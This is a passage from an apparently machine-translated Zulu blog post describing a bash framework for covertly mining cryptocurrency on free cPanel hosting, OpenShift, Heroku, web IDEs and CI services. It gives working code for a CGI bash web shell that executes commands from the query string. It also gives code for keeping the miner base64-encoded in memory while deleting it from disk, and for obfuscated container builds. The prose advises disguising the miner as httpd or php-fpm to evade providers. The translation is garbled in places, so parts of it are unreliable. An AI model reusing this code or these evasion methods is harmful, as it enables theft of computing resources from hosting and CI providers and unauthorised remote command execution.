id=editing_json><a class=header-anchor href=#editing_json> Kuhlelwa ujson</a></h3><p>Ukufaka ukuguqulwa kufayela le-json nge-bash nje esikutholile ngokufaka okuthile kwe-env var, nokunye kwe-regex. Ekuqaleni besithembele ku<code>envsubst</code> kanambambili ukufaka okuguqukayo, bese sihamba ngokugcwele<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> ngalo mqondo:<ul><li><p>funda isifanekiso sokumisa<li><p>shintsha zonke izingcaphuno ngentambo esoteric kakhulu (njenge<code>_#_#</code>)<li><p><code>eval</code> isifanekiso<li><p>buyisela zonke izehlakalo ze-esoteric emuva ngezingcaphuno</ul><p>Ngaphandle kokugwema izinqubo ezingaphansi, enye inzuzo ukuthi sithola amandla we-bash aphelele kuzifanekiso zethu. Ngokufunda nokubhala ngaphandle kwezifanekiso, kufanele sincike kumakhono we-bash regex:<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>Lokhu kusivumela ukuthi sihlele imigqa eyodwa, kokufakiwe kwemigqa eminingi kubheka umugqa wokuqala..kodwa ilunge ngokwanele icala lethu lokusebenzisa.<h2 id=runtime><a class=header-anchor href=#runtime> Isikhathi sokusebenza</a></h2><p>Ngabe isikhathi sethu sokuqalisa sibukeka kanjani? Sine inqubo eyinhloko ye-bash eyenza i-loop eyinhloko, bese inqubo encane yezimayini, i-cpu monitor sub-process, ilokhi kanye ne-tuner. Lokho kucishe kube yingcosana.<p>Okokuqala sifuna ukuqinisekisa ukuthi uma kukhona okungahambi kahle, asishiyi ukungcola, lokhu kusho ukuthi sisebenzisa isicupho se-bash ukwenza ukuhlanza lapho kunqanyulwa<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> isetha isicupho ukuvimbela ukuphindeka. Ugibe lubulala yonke imisebenzi futhi lisuse indawo yokusebenza.<p>Isikhathi sokuqala umvukuzi, ogcinwa njengokuhlukahluka kwe-bash ku-base64 encoding. Siyilahla kusistimu yefayela, bese silahla i-config, sisebenzise umvukuzi, bese sisusa zombili izimayini kanye ne-config. Ku-linux ungasusa okwenzekayo kwenqubo esebenzayo, (kumawindi lokhu akuvunyelwe).<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup> Lapho umvukuzi esebenza, ohlelweni lwefayela kukhona nje i-<code>.. /</code> isiqondisi esine-<code>b64</code> isixhumanisi kuso.<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>I-quirk evusa amadlingozi ehlangane ne-bash ngenkathi kufakwa ikhodi kumvukuzi ukuthi kunikezela okuguqukayo nge-subshell enezilinganiso<code>myvar="$(something)"</code> kubangela ukwanda unomphela ekusetshenzisweni kwememori, lokhu bekunzima ukulungisa iphutha futhi asitholanga ngempela isizathu sokuthi kungani kuziphatha kanjena, noma kunjalo isabelo kufanele singavunyelwa. Ukwenza ikhodi esikhundleni kwenziwa nge<em> izinkanyezi</em> okukhishwa kumafayili wesikhashana, okuguquguqukayo kufakwa kufayela elizobuyiselwa emuva ngenqubo.<p>Umvukuzi osebenza isikhathi eside:<ul><li><p>ngenkathi kuyiqiniso<ul><li><p>yeka umvukuzi<li><p>susa i-config<li><p>qala umvukuzi<li><p>ngenkathi kuyiqiniso<ul><li><p>qala i-daemon<ul><li><p>ngenkathi umvukuzi esebenza<ul><li><p>funda umphumela ovela kumvukuzi<li><p>khetha isenzo semayini ngokuya ngentambo yokukhipha</ul></ul><li><p>uma umvukuzi engasebenzi: break</ul><li><p>lala</ul></ul><p>Ulayini wokukhipha ufaniswe ne-regex ethile:<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>I-daemon iphatha amacala lapho<ul><li><p>ukuxhumana nephoyinti lokugcina kunikeza amaphutha (khetha iphoyinti lokugcina elingahleliwe)<li><p>izinguquko ze-hashing algorithm (lungisa isikhathi sokulala nokulungiswa kwe-ad-hoc)<li><p>Izinkinga zabavukuzi (qala kabusha umvukuzi).</ul><p>Isikhathi esithile bekukhona ukwesekwa kwedeshibhodi yomyalo nokulawula, okuvumela ukuqala kabusha ukuqala kabusha kwamanothi, kepha njengoba ukusetshenziswa kwayo bekukuncane kuye kwalahlwa, futhi iziphetho zayo zathathelwa indawo ngenye indlela yokuxhuma echibini, futhi inqubo yokuqalisa kabusha ibingazinzile, iyinkimbinkimbi. ..esinye isibonelo sesikweletu se-tech. Kodwa-ke kuvunyelwe ukulanda kabusha ukulayishwa okukhokhiwe okubuyekeziwe futhi kusethwe kabusha konke ukucushwa endizeni, obekupholile, i-trampoline yokugcina.<h2 id=debugging><a class=header-anchor href=#debugging> Ukulungisa iphutha</a></h2><p>Kunezinsiza ezintathu eziyinhloko<ul><li><p>nika amandla / khubaza ukulandelela amabhulokhi wekhodi (asifuni ukulandelela i-b64 encoded binary in a variable ..)<li><p>umsebenzi olula wokufometha izingodo<li><p>ifulegi elizosebenza ukungena ngemvume kwe-verbose ngesikhathi sokusebenza noma nini lapho kuqalwa umvukuzi.<ul><li><p>yenza ifayili<code>.debug</code> zikhona?<ul><li><p>vumela ukungena kwe-verbose</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> Ukuhanjiswa kwethagethi</a></h2><p>Lokhu kusetha kuhlolwe kuhlobo lwababungazi abathathu:<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> Iziqukathi ezizimele noma ama-VM</a></h3><p>Abahlinzeki abaningi bokubamba abathandi ukumbiwa kwezimayini ngoba izinsiza ze-CPU zivame ukwabiwa phakathi kwabasebenzisi abaningi, futhi isoftware yezimayini inganciphisa kalula ukusebenza kwe-node yomthelela ekusebenzeni kwabo bonke abanye abasebenzisi. Lokhu kungaba yiqiniso noma ngabe isikhathi somsebenzisi se-CPU singenamkhawulo, ngoba ama-hashing algorithms angagcwalisa zonke izingqimba zokulondolozwa kwesikhashana kwe-CPU uma i-cache yabiwa phakathi kwawo wonke ama-CPU cores.<p>Sithanda ukusebenzisa i-<em> okulungile</em> isabelo sezinsizakusebenza ngaphandle kokuvinjelwa, leso yisimo esihle sokusetshenziselwa ukwehlisa isitsotsi ngoba kusingathwa kokusingathwa kokusetshenziswa, okusho ukuthi<em> kufanele</em> hlala ube phakathi kwe- [AUP]. Azikho izinyathelo ezingeziwe lapho ubhekene nokuthunyelwa ngokwakho, iskripthi sesiqalisi kuphela, mhlawumbe esingezwe kulandelana lwe-boot noma lwethulwe ngesandla.<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> Ukusingathwa kwewebhu kwe-cPanel</a></h3><p>Izinhlelo zokubhaliswa kokusingathwa kwewebhu zinikezwa kakhulu nge- [cPanel]. Futhi lapha sisebenzisa izinhlelo zokubhaliselwa komuntu siqu ezinemikhawulo efanelekile yezinsizakusebenza, ngakolunye uhlangothi noma yiluphi uhlelo lwamahhala lunemikhawulo engenangqondo<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> . I-cPanel ikuvumela ukuthi uchaze abaphathi bezandiso ezahlukahlukene zefayela, lokhu kusivumela ukuthi sisebenzise imibhalo ye-Shell ngokusebenzisa i-<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> cgi</a> ngesicelo se-http ngokumelene nombhalo weShell olayishwe kuseva. Lezi zinhlobo zokuhlangana ziyindlela ama-web shells abukeka ngayo<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> . Igobolondo le-bash elula<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>Kungcono ukuthembela kuphela kuma-buildins njengoba ukubamba izinqubo ezingeziwe kungavunyelwa kumajele wewebhu, kepha kuhlala njalo kungenzeka<code>exec</code> esivumela ukuthi sisebenzise kakhulu izinsiza zomugqa womyalo. Iningi lamagobolondo ewebhu abhalwe ngezinye izilimi zokubhala ezifana ne-python noma i-php njengoba ungadingi ukukhathazeka ngemfoloko.<p>Endaweni ye-cpanel kungcono ukusebenzisa igama eli-tuli lenqubo yezimayini, njenge<code>httpd</code> noma<code>php-fpm</code> ngoba<code>cgi</code> kusekelwe ekusebenzeni okuningi, ngakho-ke amaseva ahlala agcwaliswa ngezinqubo eziningi eziqanjwe kanjena, noma ngabe umuntu obuka ngokucophelela kufanele aqaphele ifayela le-<em> imicu eminingi</em> iphethini yokusetshenziswa engajwayelekile neze (noma engenzeka) yezilimi ezinjenge-perl, php, ruby, noma i-python!<p>Izinqubo zinomkhawulo wesikhathi ngokuzenzakalela, (ihora elingu-1, usuku olungu-1, njll.), Kulokhu sisebenzisa nje umsebenzi we-cron oqala kabusha owehlayo.<p>Lokhu kudinga ukuhlelwa okuningi okwenziwa ngesandla, i-cpanel api ukwenza lokhu ngeshwa ayivezelwa abasebenzisi bokugcina, ngakho-ke ukusingathwa kwewebhu kungumgomo oyisicefe futhi oyisicefe kumdonsa phansi wethu wezimayini.<h3 id=web_environments><a class=header-anchor href=#web_environments> Izindawo zewebhu</a></h3><p>Bangu<em> I-SaaS</em> abahlinzeki abanesihleli sewebhu esihlanganiswe nesitsha, njenge<a href="with a free tier before getting acquired by amazon"> ifu9</a> , [codeanywhere], [codenvy]. Ukufaka i-dropper lapha kulula (unendawo ephelele), kepha ukuyigcina isebenza kungumthwalo, ngoba noma yimuphi umhleli wewebhu osebenzisanayo unqamula iseshini yayo ngemuva nje kokuvalwa kwekhasi lewebhu, futhi isitsha silaliswa (ngaphandle kokuthi khokha kunjalo).<p>Ukweqa lokhu kungasho kuphela ukuthi kufanele sigcine izikhathi zivulekile, okunye ukubhala nge [puppeteer] kutholile umphumela owufunayo, kepha ukusebenza isikhathi eside, ukuvuza kwenkumbulo, amakhasi ewebhu e-SPAs akuvikelekile futhi akuhambi, ngoba kusuka kumhlinzeki emuva, iseshini evulwe ngo-24/7 nakanjani izobukeka isolisa. Ngempela, izindawo zewebhu nazo ziyizinhloso ezicijile nezisicefe.<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> Izinhlelo zokusebenza zamahhala</a></h3><p>Lokhu ikakhulukazi<a href="when it used to have a free tier"> isifinyezo</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> futhi [heroku]. I-Openshift, ukuba yi-kubernetes bekuqondile ukusetshenziswa, kepha kugcwele ukucushwa kwe-churn, nansi ingcaphuno:<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(cat vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(cat <span class=hljs-variable>$launcher</span> | tail +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
cat <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
cat <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
chmod +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>Lo bekungumbhalo osetshenziselwe ukwakha isitsha sezimayini esidinga isifanekiso se-yaml:<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>Kepha yonke le nqubo ibandakanye izinyathelo eziningi!<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span>
mv <span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre><p>Kwikhodi mbumbulu:<ul><li><p>dala iphrojekthi<li><p>dala uhlelo lokusebenza ngaphandle kwesithombe<li><p>yakha isitsha semayini<li><p>phaka isitsha nge-deploy config (kubernetes abstraction)<li><p>ukukhipha ukuthunyelwa</ul><p>I-<code>build-build</code> imibhalo kunalokho yakha ifayela le-<em> Yakha</em> container obekuzokwakhiwa amahora ambalwa ngesikhathi. Ukwakhiwa nama-pods ajwayelekile anezinsizakusebenza ezihlukile ku-openhift ngakho-ke sawasebenzisa womabili. I-Openshift ibingokuhlangenwe nakho okubi kakhulu njengoba kudlule ukukhishwa okungu-4 okuhlukile (mhlawumbe ngaphezulu, ngayeka ukulandela umkhondo ngemuva kwesikhashana) futhi ngakunye kwabo kudinga ushintsho ekulungiselelweni, babengenazo izindlela zokuthuthuka futhi yonke into yashaywa indiva ngokushesha, futhi kwakuvamile okwakhiwa / ama-pods ukuze amiswe, hhayi ukuqoqwa kukadoti ... imvamisa basebenzise ukuqala kabusha ngesandla njalo ngesikhashana, mhlawumbe i-kubernetes kwakuyimbungulu nje :)<p>Ukucushwa kweHeroku kwakulula kancane (akubandakanyi ama-kubernetes). Ngaphandle kokwakhiwa kwesiqukathi, obefana ne-openhift eyodwa, okunye bekuyimiyalo emibili kuphela<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>Isitsha sicindezelwe ngqo nge-docker ngaphezulu kwirejista ye-heroku.<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> Ukungqubuzana no-heroku (okuyisigaba samahhala esisamile kuze kufike isikhathi sokubhala) ukuthi ama-dynos angasebenza kuphela izinsuku ezingama-22 ngenyanga ngakho-ke adinga ukuphathwa okwenziwa ngezandla inyanga ngayinye, futhi futhi kuyabheda futhi kuyisicefe. Benza amanye amagagasi okuvinjelwa ekuqaleni, base bekhubaza ukubhaliswa nge-TOR, ngiqinisekile ukuthi ngiyimbangela yalokhu.<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> Iziqukathi ze-CI noma ama-VM</a></h3><p>Lezi bekuyizinhloso eziqondisanayo kakhulu zomdonseli wethu. Kuningi<a href=https://en.wikipedia.org/wiki/Continuous_integration> CI</a> izinkampani, eziningi zazo ezishisa abatshalizimali imali enikeza izigaba zamahhala ngethemba lokuqoqa isabelo esithile semakethe ebhizinisini lengqalasizinda yezobuchwepheshe.<p>Zonke lezi zinsizakalo zinikela ngezinsizakusebenza ezahlukahlukene, zinezidingo ezihlukile zokulungiselela futhi zisebenza ezindaweni ezahlukahlukene. Angikaze ngicabange ukuzenzakalela ukubhaliswa kwe-akhawunti ngoba lezo zinhlobo zezinto ziyesabeka ekuhlelweni, ngizama ukukugwema ngaso sonke isikhathi, ngakho-ke ngivele ngabekezelela ukubhaliswa okwenziwa ngesandla okwesikhashana njengoba benginelukuluku lokuthi hlobo luni lwe-anti spam engizoluthola (futhi yehluke kanjani kokunye!). Ungaqagela ezinye izinto mayelana nokuphathwa kwenkampani kusuka ekutheni iphatha kanjani ugaxekile:<ul><li><p>Ingabe iyawenza amagagasi okuvinjelwa? Ngemuva kwalokho zinemigomo engeyona eqinile, izinkinga zisingathwa ngesandla futhi ngamacala<li><p>Ingabe kudinga ukuqinisekiswa kwefoni? Babevele behlukunyezwa esikhathini esedlule<li><p>Ingabe bayaphendula ekusetshenzisweni kwemithombo esindayo? Basebenza kwisabelomali esiqinile<li><p>Ingabe basebenzisa imikhawulo ye-akhawunti noma ukuvinjelwa kwethunzi? Uma bavimbela ukuvinjelwa, banama-sysadmins asho.</ul><p>Kukhona nombuzo wefilosofi: Uma insizakalo ikuvumela ukuthi usebenzise kabi uhlelo lwabo isikhathi eside, ngabe kusho ukuthi banengqalasizinda ephezulu eshalofini ekwazi ukuphatha umthwalo, noma bamane bangalawulwa kahle kohlelo lwabo? Futhi kufanele ucabangele ibhalansi phakathi kokufinyeleleka nokuphepha, uhlelo oluphephe kakhulu lunganciphisa ukugcinwa komsebenzisi.<p>Nali itafula elibonisa ezinye izinsizakalo engizithumele kuzo:<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>ukumiswa<th style=text-align:center>ukusebenza<th 